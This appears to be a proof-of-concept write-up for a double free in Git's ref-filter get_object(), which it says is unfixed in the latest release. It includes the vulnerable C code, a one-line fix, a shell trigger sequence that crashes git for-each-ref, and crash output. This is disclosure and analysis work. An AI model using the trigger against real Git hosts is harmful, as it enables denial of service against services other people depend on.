# GitDup — Git `ref-filter` double free when an object is missing (CWE-415)

| | |
|---|---|
| **Product** | Git (the `ref-filter` machinery behind `for-each-ref` / `branch` / `tag` formats) |
| **Language** | C |
| **Affected** | Git releases containing `a29e2e8fe` (2025-10-23, "ref-filter: parse objects on demand") — **through v2.56.1, the latest release** |
| **Fix** | commit `b20f82b0` "ref-filter: fix double free when an object is missing" — **unreleased** (merged to `master` 2026-11, branch `mb/ref-filter-missing-object-double-free`) |
| **CWE** | CWE-415 Double Free |
| **Prominence** | git/git — CORE_INFRA tier (the most widely deployed VCS; `prominence.py --wildcard` CORE_INFRA) |
| **Impact** | Abort / crash of the ref-filter process (DoS); double-free of a heap buffer |

## The bug

`ref-filter.c:get_object()` reads an object's content into a reused `struct expand_data` and, on
its cleanup path, frees `oi->content` **without resetting the pointer**. Because the same
`expand_data` (`oi` / `oi_deref`) is reused for every ref in the array, the next call starts with
`oi->content` still pointing at the already-freed buffer. If that next call's object lookup
**fails before it reassigns `content`** — i.e. the ref points to a missing object — it jumps
straight to the cleanup label and frees the stale pointer a **second time**.

Latest released code (git **v2.56.1**, `ref-filter.c:2344`):

```c
static int get_object(struct ref_array_item *ref, int deref,
                      struct expand_data *oi, struct strbuf *err)
{
    int eaten = 0;
    int ret;
    oi->maybe_object = NULL;
    /* NOTE: oi->content is NOT reset here */

    if (odb_read_object_info_extended(..., &oi->info, ...)) {
        ret = strbuf_addf_ret(err, -1, _("missing object %s for %s"), ...);
        goto out;                 /* content still points at the PREVIOUS ref's freed buffer */
    }
    ...
    if (oi->info.contentp) {
        ret = grab_values(ref->value, deref, oi, ..., &eaten);  /* allocs/uses oi->content */
        if (ret < 0) goto out;
    }
    grab_common_values(...);
    ret = 0;
out:
    if (!eaten)
        free(oi->content);        /* frees content again on the missing-object call */
    return ret;
}
```

The fix (`b20f82b0`) is a single line, mirroring the sibling `maybe_object` reset:

```c
     oi->maybe_object = NULL;
+    oi->content = NULL;
```

### Trigger

```sh
git init repo && cd repo
git commit --allow-empty -m initial
git tag -a -m annotated annotated                 # a valid annotated tag: content gets read+freed
# make refs/tags/missing point at an object that is not present (corruption / partial clone /
# promisor gaps / a crafted ref), so its lookup fails:
git update-ref refs/tags/missing <missing-oid>    # (git's own test uses REF_SKIP_OID_VERIFICATION)
git for-each-ref --format='%(*objectname)' refs/tags/
# -> free(): double free detected in tcache 2   (git aborts)
```

Refs are visited in sorted order, so `annotated` (which populates and frees `oi->content`) is
processed before `missing` (which re-frees the dangling pointer). Git's own regression test
`t6301` ("missing objects after a tag are reported correctly") exercises exactly this path.

## This PoC

`poc.c` is a faithful transcription of `get_object()` — the reused `expand_data`, the
`oi->content` lifetime, the `goto out` cleanup, and `if (!eaten) free(oi->content)` are all
carried over; only the object store is a stub so the PoC is self-contained. It drives the same
two-ref sequence as the regression test. Built with `zig cc` (glibc), so the crash is produced by
**glibc's real allocator**, printing the identical message git aborts with.

```
bash build.sh
./poc          # vulnerable  -> "free(): double free detected in tcache 2" / Aborted (exit 134)
./poc fixed    # applies oi->content = NULL -> survives cleanly (exit 0)
```

Observed:

```
[*] get_object(vulnerable)  for the annotated tag (valid object)
    refs/tags/annotated -> read object content @0x191e02a0
    (oi.content freed at 'out'; pointer left = 0x191e02a0 <-- DANGLING, not reset)
[*] get_object(vulnerable)  for a ref whose object is MISSING
    error: missing object for refs/tags/missing
free(): double free detected in tcache 2
Aborted
```

`./poc fixed` resets `oi->content` and runs to completion.

## Exploitability assessment

- **Reachability:** `get_object()` is on the hot path of `git for-each-ref`, `git branch`,
  `git tag` and any porcelain/`cat-file --batch`-style formatting that uses `ref-filter` with a
  content-reading atom (e.g. `%(*objectname)`, `%(*contents)`). The precondition is a ref whose
  object is missing *after* a ref whose object was read — reachable via repository corruption,
  **partial/promisor clones** (objects are intentionally absent until fetched), interrupted
  fetches, or a crafted repository fed to a tool/host that enumerates refs.
- **Impact:** deterministic abort of the git process (denial of service). Server-side ref
  enumeration on hosted/forge git (running `for-each-ref` over pushed or mirrored repos) can be
  crashed by a repository in this state. Double frees are, in principle, heap-exploitable, but
  glibc's tcache double-free detector turns this into a controlled `abort()` in practice, so the
  honest rating is **DoS**.
- **Faithfulness / honest scope:** this is the real control flow and the real fix, demonstrated
  against glibc's real allocator. The stubbed object read is the only abstraction; the bug is a
  property of the pointer-reuse logic, not of the stub. No CVE is assigned yet; the bug is present
  in the latest release and the fix is not yet shipped.
